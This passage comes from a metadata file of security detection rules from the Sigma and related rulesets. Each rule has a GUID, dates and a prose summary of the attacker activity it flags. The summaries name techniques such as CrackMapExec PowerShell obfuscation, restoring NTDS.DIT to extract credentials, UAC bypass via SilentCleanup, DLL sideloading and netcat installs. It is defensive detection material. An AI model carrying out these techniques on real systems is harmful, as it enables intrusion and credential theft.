  Updated-Date: '2024_09_03'
6f7e1c10-2dc9-4312-adb6-9574ff09a5c8:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 242753b3f87ecb2d0eb9c9a4106cae18
  Ruleset: sigmahq
  Summary: This rule detects when a successful Multi-Factor Authentication (MFA) occurs
    as a result of using a bypass code in Cisco Duo. A bypass code is a temporary
    passcode generated by an administrator for a specific user to access a Duo-protected
    application, typically used when users face issues with their mobile devices,
    such as service disruptions, loss, theft, or lack of mobile data services.
  Updated-Date: '2024_09_04'
6f8b3439-a203-45dc-a88b-abf57ea15ccf:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 75c62b59944e34253c4dfe2daaec6f54
  Ruleset: core
  Summary: This rule detects PowerShell obfuscation implemented by the CrackMapExec
    pentesting framework, which includes specific static strings within the obfuscated
    code. CrackMapExec is a tool used for penetration testing, and identifying its
    obfuscated PowerShell commands can be crucial for security monitoring. The detection
    focuses on characteristics and usage patterns such as specific command lines containing
    sequences like 'join*split' and '($PSHome[*]+$PSHOME[*]+'. Monitoring for these
    patterns helps in identifying potentially malicious activities associated with
    this framework.
  Updated-Date: '2024_09_03'
6fb63b40-e02a-403e-9ffd-3bcc1d749442:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: d1222ff18c0e58212d0e14fea4e04c98
  Ruleset: core
  Summary: This rule detects the use of Metasploit SMB PsExec and Impacket `psexec.py`
    by monitoring specific service installations. The detection looks for the creation
    of services with particular naming conventions and characteristics, such as an
    8-character executable file name located in the system root and service names
    that are either 4, 8, or 16 characters long, with an on-demand start type and
    a service type of '0x10'. This activity can indicate lateral movement within a
    network and potential unauthorized remote execution. The rule filters out the
    default PsExec service (`PSEXESVC`) to reduce false positives.
  Updated-Date: '2024_09_03'
6fb77778-040f-4015-9440-572aa9b6b580:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: b5728dfae384f3241cc320baf423ccac
  Ruleset: sigmahq
  Summary: This rule detects when an account makes changes to the ingress or egress
    rules of a security group. Such modifications can indicate an attacker's attempt
    to create new attack vectors, exfiltrate data over the network, or enable communication
    between machines in a VPC/Subnet and a command and control server.
  Updated-Date: '2024_09_04'
6fe1719e-ecdf-4caf-bffe-4f501cb0a561:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 5f9f9e153ee4eeab009399a80d6f08a5
  Ruleset: emerging-threats
  Summary: This rule detects the creation of a suspicious file resulting from proof-of-concept
    (PoC) code targeting the Windows Print Spooler Remote Code Execution Vulnerability
    CVE-2021-34527, also known as PrinterNightmare and CVE-2021-1675. The detection
    focuses on files located within the directory `:\Windows\System32\spool\drivers\x64\`.
    The rule aims to identify potential exploitation attempts by examining specific
    file submissions to Symantec for analysis, distinguishing actual threats from
    benign files.
  Updated-Date: '2024_09_03'
6fe4aa1e-0531-4510-8be2-782154b73b48:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 65a8a6f97dce8274dc8568ca7837eb14
  Ruleset: sigmahq
  Summary: This rule detects the recovery of files from backups using "wbadmin.exe".
    Attackers can use this executable to restore sensitive files, such as NTDS.DIT
    or Registry Hives, from backups to potentially extract credentials.
  Updated-Date: '2024_09_04'
6ff08e55-ea53-4f27-94a1-eff92e6d9d5c:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 6fd8a144faa395aab77cc80016537ac0
  Ruleset: sigmahq
  Summary: This rule detects the execution of the "sysctl" command on macOS systems
    with specific arguments commonly utilized by threat actors and malware. The "sysctl"
    command is used to obtain system hardware information and is leveraged by malicious
    entities primarily to detect and avoid virtualization and analysis environments.
  Updated-Date: '2024_09_04'
7002aa10-b8d4-47ae-b5ba-51ab07e228b9:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 96457d83ffd1fa7d8e965643121dc0b4
  Ruleset: core
  Summary: This rule detects potential sideloading of the "mpclient.dll" library by
    observing the execution of Windows Defender processes, specifically "MpCmdRun.exe"
    and "NisSrv.exe", from non-default directories. This behavior may indicate an
    attempt to exploit these processes for malicious purposes, as legitimate executions
    typically occur only from specific default directories associated with Windows
    Defender. Detecting these occurrences can help identify attempts to evade defenses
    by leveraging trusted Windows Defender files.
  Updated-Date: '2024_09_03'
700fb7e8-2981-401c-8430-be58e189e741:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 2dc46ef1292ab9cd492511fb6d2fd502
  Ruleset: sigmahq
  Summary: This rule detects the installation of suspicious packages on Linux systems
    using common system installation utilities. It monitors package management tools
    like apt, apt-get, yum, rpm, and dpkg, looking for installation commands associated
    with potentially suspicious software such as nmap, netcat, wireshark, tshark,
    openconnect, and proxychains. While these tools can be used for legitimate administrative
    purposes, they are often associated with network scanning, sniffing, and tunneling
    activities, making their unexpected appearance on a system a potential security
    concern.
  Updated-Date: '2024_09_04'
7021255e-5db3-4946-a8b9-0ba7a4644a69:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 401022bee20c8075be6368eb3c65ee99
  Ruleset: core
  Summary: This rule detects potential abuse of the provisioning registry key for
    indirect command execution using "Provlaunch.exe". The registry key "\SOFTWARE\Microsoft\Provisioning\Commands\"
    and its subkey must be monitored to identify suspicious modifications. This technique
    can be employed by adversaries to evade defenses by executing commands indirectly
    through the valid system executable Provlaunch.exe, which is a living-off-the-land
    binary (LOLBin). This behavior is typically associated with defense evasion tactics.
  Updated-Date: '2024_09_03'
7034cbbb-cc55-4dc2-8dad-36c0b942e8f1:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: fa5220bdeb38749c755c03b40ee00dbe
  Ruleset: sigmahq
  Summary: This rule detects the use of obfuscated PowerShell commands employing the
    COMPRESS OBFUSCATION method. Specifically, it identifies scripts that instantiate
    new objects using 'new-object', utilize ASCII encoding via 'text.encoding]::ascii',
    and leverage compression techniques with terms such as 'system.io.compression.deflatestream'
    and 'system.io.streamreader', ultimately ending with 'readtoend'. These patterns
    are indicative of attempts to obscure the script's true intent, often used for
    evading detection and executing malicious operations on Windows systems.
  Updated-Date: '2024_09_04'
7047d730-036f-4f40-b9d8-1c63e36d5e62:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 0d19c51e26e8b7f86f393d6c9f5ab03c
  Ruleset: sigmahq
  Summary: This rule detects PowerShell creating binary executables or script files.
    It focuses on instances where PowerShell processes (such as powershell.exe or
    pwsh.exe) generate files with specific extensions, including but not limited to
    .bat, .dll, .exe, .js, and .vbs. The rule incorporates additional filters to exclude
    common system and user temporary directory paths, such as 'C:\Users\[username]\AppData\Local\Temp\'
    and 'C:\Windows\Temp\', to reduce false positives. The detection mechanism aims
    to identify potentially malicious activities, such as malware distribution facilitated
    by PowerShell.
  Updated-Date: '2024_09_04'
7050bba1-1aed-454e-8f73-3f46f09ce56a:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: d0ecf5b50b8c92b5afae3207db56136f
  Ruleset: sigmahq
  Summary: This rule detects the execution of the "cloudflared" tool, specifically
    when it is used with the "cleanup" flag to manage and close existing tunnel connections.
    The rule identifies command lines containing both "tunnel" and "cleanup" along
    with optional parameters like "-config" and "-connector-id." Cloudflared is a
    tool provided by Cloudflare to establish secure and private tunnels for web services,
    enabling users to connect their applications securely to the Cloudflare network.
    Legitimate usage of Cloudflared for managing these connections may trigger this
    detection.
  Updated-Date: '2024_09_04'
70761fe8-6aa2-4f80-98c1-a57049c08e66:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 16a0de55baa3c9cde0ae0e23055b3a7c
  Ruleset: emerging-threats
  Summary: This rule detects a DNS query initiated from a "wscript" process for domains
    matching a specific pattern associated with SocGholish Command and Control (C2)
    traffic. SocGholish is a type of malware known for delivering fake software updates
    to trick users into downloading and executing malicious payloads. The detection
    focuses on identifying the unique domain naming conventions used by SocGholish
    to establish communication with its C2 servers, which can be indicative of an
    ongoing malware infection.
  Updated-Date: '2024_09_03'
707e097c-e20f-4f67-8807-1f72ff4500d6:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: a2b6721153120471f11a84fd28ac9520
  Ruleset: core
  Summary: This rule detects changes to the "Default" property for registry keys located
    in the \Software\Microsoft\Windows\CurrentVersion\App Paths\ directory, which
    can be indicative of a persistence mechanism. The entries under App Paths are
    used to map an application's executable file name to its fully qualified path
    and to modify the PATH environment variable on a per-application, per-process
    basis. Suspicious modifications include references to paths such as \Users\Public,
    \AppData\Local\Temp\, \Windows\Temp\, \Desktop\, \Downloads\, and others, as well
    as certain binaries and file types like .bat, .hta, .dll, and .ps1, which are
    commonly used by attackers for persistence.
  Updated-Date: '2024_09_03'
7090adee-82e2-4269-bd59-80691e7c6338:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 8e3a5f3a758e79623665a495022970b7
  Ruleset: sigmahq
  Summary: This rule detects the use of the `chcp` command to look up the system locale
    value, which is often used as part of host discovery. The `chcp` command, executed
    by `chcp.com`, is identified when it is run from `cmd.exe` with parent command
    lines containing certain flags like `-c`, `-r`, or `-k`. This behavior could be
    indicative of adversary tactics as described in threat references, potentially
    linked to threat actors such as those involved in ransomware attacks. However,
    legitimate software like Anaconda during updates and Discord have been known to
    execute the `chcp` command, which could lead to false positives.
  Updated-Date: '2024_09_04'
7091372f-623c-4293-bc37-20c32b3492be:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 17dd68fbb0340c163b1d6028f180eab6
  Ruleset: sigmahq
  Summary: This rule detects when end user consent is blocked due to risk-based consent
    mechanisms within Azure audit logs. This scenario typically arises when user access
    to certain applications is deemed risky and, as a result, is automatically restricted
    to protect credential access and prevent potential security breaches.
  Updated-Date: '2024_09_04'
70ad0861-d1fe-491c-a45f-fa48148a300d:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 92815780c68dc3f6261d7757f0aafc60
  Ruleset: sigmahq
  Summary: This rule detects when a user downloads a file using CertOC.exe on Windows.
    CertOC.exe, commonly associated with Certificate Enrollment Protocol (CEP), can
    be exploited for downloading files over HTTP by specifying the '-GetCACAPS' and
    'http' command-line arguments. This type of behavior could indicate command-and-control
    activity within the system.
  Updated-Date: '2024_09_04'
70ad982f-67c8-40e0-a955-b920c2fa05cb:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 648697799c3e8ebb27e3a35171b0e5e4
  Ruleset: sigmahq
  Summary: This rule detects the creation and use of an IO.FileStream object in PowerShell
    to open a handle on a drive volume via the \\.\ DOS device path specifier. It
    specifically monitors for direct access read operations of the initial bytes of
    the volume, indicating potential attempts to perform unauthorized or suspicious
    activities that could involve bypassing standard file system access controls.
    These actions can be associated with defense evasion techniques and are commonly
    found in malicious scripts attempting to manipulate or conceal data at a low level.
  Updated-Date: '2024_09_04'
70b4156e-50fc-4523-aa50-c9dddf1993fc:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 812943ee9392b41c8a7681bffcd85d04
  Ruleset: sigmahq
  Summary: This rule detects the manipulation of TCP traffic by redirecting it from
    one port to another using iptables on a Linux system. Specifically, it monitors
    commands that involve the `iptables` utility with the parameters for NAT table
    redirection, indicating that traffic intended for a particular port (e.g., port
    22 for SSH) is being rerouted to a different, presumably malicious port (e.g.,
    ports starting with 42 or 43). This behavior suggests the presence of the Bpfdoor
    backdoor, which appears to route encrypted SSH traffic to a shell port instead,
    facilitating unauthorized access.
  Updated-Date: '2024_09_04'
70bc5215-526f-4477-963c-a47a5c9ebd12:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 068329b10ba689bd0031db56116b44ce
  Ruleset: sigmahq
  Summary: This rule detects the use of the "Import-Module" cmdlet to load the "Microsoft.ActiveDirectory.Management.dll"
    DLL, which is commonly leveraged by attackers to perform Active Directory enumeration.
    This activity often involves using PowerShell executables such as powershell.exe
    or pwsh.exe. The detection is based on identifying specific command line patterns
    indicative of this behavior. Such operations may sometimes occur during legitimate
    administrative tasks but can also indicate potential reconnaissance activities
    by malicious actors.
  Updated-Date: '2024_09_04'
70d43542-cd2d-483c-8f30-f16b436fd7db:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 1093e11acaa573a877fe5c898c09de7d
  Ruleset: emerging-threats
  Summary: This rule detects the creation or modification of a specific registry key
    associated with the Leviathan Advanced Persistent Threat (APT) group, particularly
    observed in a campaign targeting Malaysia. The targeted registry path is '\Software\Microsoft\Windows\CurrentVersion\Run\ntkd'
    and such activity may indicate an attempt to achieve persistence on Windows systems.
  Updated-Date: '2024_09_03'
70e8e9b4-6a93-4cb7-8cde-da69502e7aff:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 4f3a9dc1643227d4bc3a1f5af4094db7
  Ruleset: sigmahq
  Summary: This rule detects DLL sideloading of the VMGuestLib.dll file by the WmiApSrv
    service. This technique involves loading a malicious version of the VMGuestLib.dll,
    typically placed in a specific directory path related to VMware Tools, while the
    WmiApSrv.exe executable from the Windows System32 directory is running. This form
    of DLL sideloading can be used for defense evasion, persistence, and privilege
    escalation by attackers. The rule looks for events where the specified VMGuestLib.dll
    file is loaded by the WmiApSrv service, excluding cases where the DLL is signed,
    to limit false positives.
  Updated-Date: '2024_09_04'
70ed1d26-0050-4b38-a599-92c53d57d45a:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 27631f13833b1ef3f59044aeed96bb86
  Ruleset: sigmahq
  Summary: This rule detects user authentication failure events within Bitbucket.
    It identifies instances where a user login has failed, which could be indicative
    of credential access attempts or defense evasion tactics. To optimize its accuracy,
    correlating the events with the "author.name" field is recommended. The detection
    is based on audit logs requiring an "Advance" log level configuration.
  Updated-Date: '2024_09_04'
70f00d10-60b2-4f34-b9a0-dc3df3fe762a:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: b9d7dbe337612439809db3189841d659
  Ruleset: core
  Summary: This rule detects suspicious service installation scripts on Windows systems.
    It monitors the Service Control Manager for events indicating a service installation
    (Event ID 7045) and identifies specific command-line flags and binaries commonly
    associated with malicious activities. These binaries include "cscript," "mshta,"
    "powershell," "pwsh," "regsvr32," "rundll32," and "wscript." The detection aims
    to uncover potential persistence and privilege escalation attempts by examining
    characteristic command-line patterns in the service image paths.
  Updated-Date: '2024_09_03'
7100f7e3-92ce-4584-b7b7-01b40d3d4118:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 30eab8a4c774f9fa730ce9c7b7ba60bf
  Ruleset: core
  Summary: This rule detects the presence of a default Cobalt Strike certificate in
    HTTPS traffic. Cobalt Strike is a commercial adversary simulation software often
    used by threat actors for command-and-control operations. The detection is based
    on identifying a specific certificate serial number, which is indicative of the
    default certificate used by Cobalt Strike servers.
  Updated-Date: '2024_09_03'
71158e3f-df67-472b-930e-7d287acaa3e1:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 1d01b5ab65e8c43f87183350e1366344
  Ruleset: core
  Summary: This rule detects the execution of a non-existing file by checking if the
    image specified in a process creation event is not a full, absolute path. This
    behavior can be indicative of process ghosting or other unconventional methods
    used to start a process. The rule excludes certain system and registry processes
    and filters out cases where the image is null, empty, or a dash.
  Updated-Date: '2024_09_03'
711ab2fe-c9ba-4746-8840-5228a58c3cb8:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 1bafc4ee71cf5bd24f87d63450264530
  Ruleset: emerging-threats
  Summary: This rule detects the execution of the extended stored procedure backdoor
    named Maggie within the context of Microsoft SQL Server. The detection focuses
    on identifying specific events where the MSSQLSERVER provider logs an event with
    ID 8128 that contains the term 'maggie' in its message.
  Updated-Date: '2024_09_03'
7124aebe-4cd7-4ccb-8df0-6d6b93c96795:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 70de9fdc2602c86e9eb2e3790fab33b1
  Ruleset: core
  Summary: This rule detects a suspicious method of dumping the kernel on Windows
    systems using the `dtrace.exe` utility. The `dtrace.exe` tool, included in Windows
    from version 10 19H1 onwards, is typically used for dynamic tracing of system
    calls and kernel events. The rule identifies suspicious activity by checking for
    specific command-line patterns associated with the tool, which may indicate an
    attempt to extract sensitive information from the kernel.
  Updated-Date: '2024_09_03'
71886b70-d7b4-4dbf-acce-87d2ca135262:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: ddf8a755b6efed7d6192a2f11534330d
  Ruleset: sigmahq
  Summary: This rule detects attempts at remote code execution exploiting the PrintNightmare
    vulnerability (CVE-2021-1675) in the Windows Spooler Service by observing rejected
    SMB guest logons. The detection focuses on instances where EventID 31017 is logged
    with an empty UserName field and a ServerName starting with '\1'. This behavior
    is linked to techniques used in credential access attacks.
  Updated-Date: '2024_09_04'
7195a772-4b3f-43a4-a210-6a003d65caa1:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 639f913a2715b6585196bb0d1ca459fd
  Ruleset: core
  Summary: This rule detects suspicious malformed user agent strings in proxy logs.
    It identifies user agent values that start with unusual patterns such as "user-agent",
    "Mozilla/3.0 ", "Mozilla/2.0", or have malformed elements like "Mozila/" or missing
    slashes. Additionally, it flags user agents containing typographical errors like
    " (compatible;MSIE " or those with specific substrings such as "loader". The rule
    also looks for exact matches with user agents known for being associated with
    malicious software, including "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:60.0)"
    used by Cobalt Strike Beacon, or "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:28.0)
    Gecko/20100101 Firefox/28.0", linked to APT28 malware. Finally, exceptions are
    made for legitimate software like Adobe products.
  Updated-Date: '2024_09_03'
71b31e99-9ad0-47d4-aeb5-c0ca3928eeeb:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: f70415c3732ab3b00b90e1e2050b68ac
  Ruleset: core
  Summary: This rule detects potential DLL sideloading of "waveedit.dll," which is
    associated with the Nero WaveEditor audio editing software. It identifies instances
    where the "waveedit.dll" file is loaded by verifying that it is not being loaded
    from legitimate paths associated with the Nero WaveEditor application. This type
    of activity may indicate a defense evasion or privilege escalation attempt by
    malicious actors using DLL sideloading techniques.
  Updated-Date: '2024_09_03'
71c276aa-49cd-43d2-b920-2dcd3e6962d5:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 3e71c6d24c24155ee4f077d374027487
  Ruleset: core
  Summary: This rule detects the installation of a service by a client process that
    has a Process ID (PID) of 0 or a parent process with a PID of 0. The event is
    logged by the Windows Service Control Manager and is identified by Event ID 7045.
  Updated-Date: '2024_09_03'
71c432c4-e4da-4eab-ba49-e60ea9a81bca:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 05e39afa6e6cdd6521478e1e8d3b1076
  Ruleset: emerging-threats
  Summary: This rule detects the execution of the POWERHOLD script associated with
    the FIN7 cybercriminal group. The script specifically operates on Windows systems
    and involves PowerShell script blocks that include references to environment variables,
    custom functions, and utilization of specific executables such as WScript. This
    activity is indicative of malicious behavior used by FIN7, targeting execution-related
    vulnerabilities in their campaigns.
  Updated-Date: '2024_09_03'
71d65515-c436-43c0-841b-236b1f32c21e:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 15e5d1b118928d391e0f81507cd6630e
  Ruleset: sigmahq
  Summary: This rule detects deletion events from Cisco flash file systems by monitoring
    specific keywords such as "erase," "delete," and "format." The purpose of this
    detection is to capture potential defense evasion or impact tactics, which may
    involve file system modifications that could disrupt normal operations or erase
    critical data. Administrators might occasionally trigger this rule during routine
    maintenance to free up flash space, which should be considered when analyzing
    the results.
  Updated-Date: '2024_09_04'
71ff406e-b633-4989-96ec-bc49d825a412:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 959891b874a1ffcd49ba0295be4d9af2
  Ruleset: sigmahq
  Summary: This rule detects PowerShell scripts using the "Compress-Archive" Cmdlet
    to compress folders and files, with the output stored in a potentially suspicious
    location often used by malware for data exfiltration. The detection focuses on
    compressed data stored in temporary directories such as `$env:TEMP`, `\AppData\Local\Temp\`,
    and `:\Windows\Temp\`. Adversaries might use this technique to make collected
    sensitive documents portable and to minimize the data sent over the network during
    exfiltration attempts.
  Updated-Date: '2024_09_04'
72124974-a68b-4366-b990-d30e0b2a190d:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 346ea2c3d5668b290954967cd15182d7
  Ruleset: core
  Summary: 'This rule detects Metasploit SMB authentication attempts within a domain.
    It focuses on specific Windows security events, including failed (EventID 4625)
    and successful (EventID 4624) logins as well as NTLM authentications (LogonType:
    3), and verifies if the workstation name matches a 16-character alphanumeric pattern.
    It also monitors Event ID 4776 for the same workstation name pattern, alerting
    on potential unauthorized lateral movement attempts indicative of Metasploit framework
    activity.'
  Updated-Date: '2024_09_03'
7215374a-de4f-4b33-8ba5-70804c9251d3:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 4539c40b0b729607054e48d1eab87907
  Ruleset: sigmahq
  Summary: This rule detects unauthorized access attempts to a resource in Bitbucket
    by monitoring audit logs categorized under security that record actions indicating
    unauthorized attempts to access.
  Updated-Date: '2024_09_04'
724ea201-6514-4f38-9739-e5973c34f49a:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 2cf5adb0b9fbb713693e884449bb8160
  Ruleset: core
  Summary: This rule detects the setting of the environment variable "windir" to a
    non-default value, which attackers often exploit to bypass User Account Control
    (UAC) via the "SilentCleanup" task. The SilentCleanup task located in %windir%\system32\cleanmgr.exe
    is an auto-elevated task that, when abused, can elevate any file with administrator
    privileges without prompting UAC.
  Updated-Date: '2024_09_03'
727454c0-d851-48b0-8b89-385611ab0704:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: e015437ac718d69c3f7fdd925904da20
  Ruleset: sigmahq
  Summary: This rule detects the usage of the "unregmp2.exe" binary as a proxy to
    launch a custom version of "wmpnscfg.exe" on Windows systems. The detection focuses
    on process creation logs specifically looking for instances where the image path
    ends with "unregmp2.exe" and the command line includes "/HideWMP". This behavior
    is associated with defense evasion techniques, as outlined in relevant threat
    frameworks.
  Updated-Date: '2024_09_04'
7280c9f3-a5af-45d0-916a-bc01cb4151c9:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 77891a20bc6b80c96bea7f244fb6ea0f
  Ruleset: core
  Summary: This rule detects suspicious activity involving the MSExchangeMailboxReplication
    process writing .asp and .aspx files to disk. Such behavior could indicate an
    exploitation attempt related to ProxyShell, a known vulnerability that affects
    Microsoft Exchange servers and can be leveraged for initial access and persistence
    by attackers.
  Updated-Date: '2024_09_03'
72862bf2-0eb1-11eb-adc1-0242ac120002:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 24a4215f9a711f0955f5b6840969109e
  Ruleset: core
  Summary: This rule detects the obfuscated use of stdin to execute PowerShell commands
    via the Windows Service Control Manager. It targets instances where command prompts
    (cmd) are used to run PowerShell scripts with specific indicators of obfuscation,
    including the presence of 'powershell', 'noexit', and strings such as 'input'
    with character obfuscation techniques. This kind of activity is commonly associated
    with attempts to evade detection and manipulate script execution contexts, typical
    in malicious administrative tasks or malware operations.
  Updated-Date: '2024_09_03'
729ce0ea-5d8f-4769-9762-e35de441586d:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 4f53f2a3b60f3bbab1a0513129bb52e0
  Ruleset: core
  Summary: This rule detects the use of specific command line flag combinations by
    the executable mpiexec.exe from the High Performance Computing (HPC) pack. These
    flags can be exploited to execute arbitrary binaries, presenting a potential security
    threat.
  Updated-Date: '2024_09_03'
72af37e2-ec32-47dc-992b-bc288a2708cb:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: a4658c17a05bcf6f94b7fd0aedff403e
  Ruleset: sigmahq
  Summary: This rule detects the creation of a new CloudShell within the Azure portal.
    This activity is monitored by identifying specific operations in Azure activity
    logs, primarily focusing on the operation named "MICROSOFT.PORTAL/CONSOLES/WRITE."
    While administrators might legitimately create a new CloudShell, this event could
    also signify potential unauthorized or malicious activity, such as execution of
    commands within the cloud environment.
  Updated-Date: '2024_09_04'
72ca7c75-bf85-45cd-aca7-255d360e423c:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: c7835e00ba0a79afcf53fdb1950ee832
  Ruleset: sigmahq
  Summary: This rule detects the potential for Dynamic Link Library (DLL) sideloading
    involving the "chrome_frame_helper.dll" file on Windows systems. Specifically,
    it identifies instances where this DLL is loaded from locations outside the expected
    directories typically associated with standard Google Chrome installations, such
    as "C:\Program Files\Google\Chrome\Application" or "C:\Program Files (x86)\Google\Chrome\Application".
    This monitoring helps identify unauthorized or potentially malicious use of the
    DLL, which could be an indication of defense evasion, persistence mechanisms,
    or privilege escalation tactics employed by attackers.
  Updated-Date: '2024_09_04'
730fc21b-eaff-474b-ad23-90fd265d4988:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 29289b939e71bca59a3f937114d7bce9
  Ruleset: sigmahq
  Summary: This rule detects the execution of the PsExec utility by identifying processes
    where the executable image ends with "psexec.exe" or the original file name is
    "psexec.c". PsExec is a Microsoft tool commonly used for executing processes on
    remote systems, often seen in both administrative scripts and malicious activities
    such as lateral movement by threat actors.
  Updated-Date: '2024_09_04'
731231b9-0b5d-4219-94dd-abb6959aa7ea:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 6a675a141d93c3240f2787a8eb962fda
  Ruleset: core
  Summary: This rule detects suspicious activities involving the `rundll32.exe` process
    on Windows systems, specifically when the command line includes a `.sys` file.
    This type of behavior has been observed in the activities of the threat group
    UNC2452, known for using such techniques to evade defenses.
  Updated-Date: '2024_09_03'
734f8d9b-42b8-41b2-bcf5-abaf49d5a3c8:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 1d7f8148386774ecdfe407d3f739ed4d
  Ruleset: sigmahq
  Summary: This rule detects remote PowerShell sessions by monitoring for the presence
    of the `wsmprovhost.exe` process, which is associated with Windows Management
    Instrumentation (WinRM). Specifically, it identifies instances where `wsmprovhost.exe`
    appears either as a parent or child process, indicating an active remote PowerShell
    session. This detection helps in identifying potential unauthorized remote PowerShell
    operations, but legitimate remote administrative activities could also trigger
    this rule.
  Updated-Date: '2024_09_04'
736ffa74-5f6f-44ca-94ef-1c0df4f51d2a:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: a93dc038c125969c8d125e1999944fad
  Ruleset: sigmahq
  Summary: This rule detects file creation events in Windows systems indicative of
    the use of CrackMapExec, a post-exploitation tool commonly used by attackers for
    credential access. It looks for file paths starting with "C:\Windows\Temp\" and
    filenames ending with specific patterns such as "\temp.ps1" or "\msol.ps1", as
    well as filenames matching certain regular expressions, like GUIDs and temporary
    file patterns.
  Updated-Date: '2024_09_04'
737e618a-a410-49b5-bec3-9e55ff7fbc15:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 4840be65bf029b2044b62a946601b992
  Ruleset: core
  Summary: This rule detects the suspicious use of 'calc.exe', the Windows Calculator
    application, when it is executed with specific command-line parameters or from
    non-standard directories. Such behavior is often indicative of proof-of-concept
    (PoC) activities or attempts to evade detection mechanisms. The rule triggers
    when 'calc.exe' is found outside its typical locations within the Windows directory
    structure (such as Windows\System32, Windows\SysWOW64, or Windows\WinSxS), or
    when it is launched with unusual command-line arguments that deviate from typical
    usage patterns.
  Updated-Date: '2024_09_03'
738cb115-881f-4df3-82cc-56ab02fc5192:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 8f3ea187ab0f8fd92cf607d752ad1942
  Ruleset: emerging-threats
  Summary: This rule detects potential exploitation attempts targeting the Cacti software
    vulnerability identified as CVE-2022-46169, which involves command injection.
    It monitors for specific patterns in GET requests to a webserver, particularly
    looking for malicious payloads exploiting the "remote_agent.php" script with certain
    encoded commands that can indicate an attempt to execute unauthorized operations.
    The detection criteria include the presence of suspicious command strings like
    base64 decoding followed by command execution and other typical command injection
    methods. Detection patterns also include URL-encoded versions of these attack
    vectors. These signatures help identify unauthorized access and injection attempts
    that could compromise the server running Cacti.
  Updated-Date: '2024_09_03'
738d9bcf-6999-4fdb-b4ac-3033037db8ab:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: a1e88efea297463d66c83a22e58d42d0
